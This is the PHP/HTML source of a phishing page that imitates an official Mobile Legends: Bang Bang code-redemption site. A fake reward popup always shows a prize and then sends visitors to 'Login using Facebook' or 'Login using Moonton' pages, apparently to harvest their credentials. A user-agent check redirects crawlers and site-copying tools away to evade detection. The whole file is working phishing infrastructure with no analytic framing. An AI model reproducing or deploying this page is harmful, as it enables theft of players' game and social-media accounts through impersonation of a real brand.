<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php, true, 301');
die();
}
?>
<?php
$array_img = array(
'img/reward/1.jpeg',
'img/reward/2.jpeg',
'img/reward/3.jpeg',
'img/reward/4.jpeg',
'img/reward/5.jpeg',
'img/reward/6.jpeg',
'img/reward/7.jpeg',
'img/reward/8.jpeg',
'img/reward/9.jpeg',
);
$array_img_result = $array_img[rand(0, (count($array_img)-1))];
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta property="og:title" content="Mobile Legends: Bang Bang">
<meta name="description" content="Redeem your Mobile Legends: Bang Bang code and get free rewads">
<meta property="og:description" content="Redeem your Mobile Legends: Bang Bang code and get free rewads">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Mobile Legends: Bang Bang">
<meta property="og:type" content="website">
<meta name="copyright"content="Moonton">
<meta name="theme-color" content="#232427">
<meta property="og:image" content="https://i.ibb.co/C832Ykg/Capture.png">
<title>Mobile Legends: Bang Bang</title>
<link rel="stylesheet" href="https://mobilelegends-codexchange.herokuapp.com/css/style.css">
<link rel="stylesheet" href="http://freeskin2022.herokuapp.com/static/css/imryu.css">
<link rel="stylesheet" href="http://freeskin2022.herokuapp.com/static/css/facebook.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MCCJCRN');</script>
<!-- End Google Tag Manager -->
</head>
<body>
	<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MCCJCRN"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<div class="container">
<div class="header">
<img class="slider" src="https://s10.gifyu.com/images/Cinepolis-Banner.jpg">
<img class="slider" src="https://s10.gifyu.com/images/imagesfaef63de2f9601467502adc213c17e28.jpg">
<img class="slider" src="https://s10.gifyu.com/images/images-3c437c2a813ae4307815a97f28be4e23d.jpg">
<img class="slider" src="img/bnr1.jpg">
<img class="slider" src="https://s10.gifyu.com/images/SLIDE-POSTER_01.jpg">
</div>
<ul>
<li>
<span>Redemption Code</span>
<input type="text" id="code" placeholder="">
</li>
<li>
<span>Game ID</span>
<input type="number" id="playid" placeholder="">
</li>
<p>Verification code will be sent to your in-game mailbox,vaild for 30 mins</p>
<button class="btn" type="submit"><span>Reedem</span></button>
</ul>
</div>

<div class="popup redemption_status" style="display: none;">
<div class="popup-box">
<a class="popup-close close_redemption_status"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup">
<div class="nav-popup-title">Redemption Status</div>
</div>
<div class="popup-alert">Please enter all the required information</div>
<div class="popup-icon">
<i class="zmdi zmdi-close-circle-o"></i>
</div>
<button type="button" class="popup-btn close_redemption_status">Try again</button>
</div>
</div>

<div class="popup redemption_false" style="display: none;">
<div class="popup-box">
<a class="popup-close close_redemption_false"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup">
<div class="nav-popup-title">Redemption Status</div>
</div>
<div class="popup-alert">Invalid redemption code</div>
<div class="popup-icon">
<i class="zmdi zmdi-close-circle-o"></i>
</div>
<button type="button" class="popup-btn close_redemption_false">Try again</button>
</div>
</div>

<div class="popup redemption_reward" style="display: none;">
<div class="popup-box">
<a href="" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup">
<div class="nav-popup-title">Redemption Status</div>
</div>
<div class="popup-alert">Congratulations, you got:</div>
<img class="popup-item" src="<?php echo ''.$array_img_result.''; ?>">
<button type="button" class="popup-btn open_account_login">Claim</button>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div>
</div>
<div class="popup-alert">Login to receive your rewards</div>
<button type="button" class="btn-login bg-facebook" onclick="location.href='login/facebook';"><i class="fa fa-facebook-square"></i> Login using Facebook</button>
<button type="button" class="btn-login bg-moonton" onclick="location.href='login/moonton';"><i class="fa fa-user-circle"></i> Login using Moonton</button>
</div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://myrestapi.kazugawa.repl.co/slider.js"></script>
<script src="https://myrestapi.kazugawa.repl.co/script.js"></script>
</body>
</html>	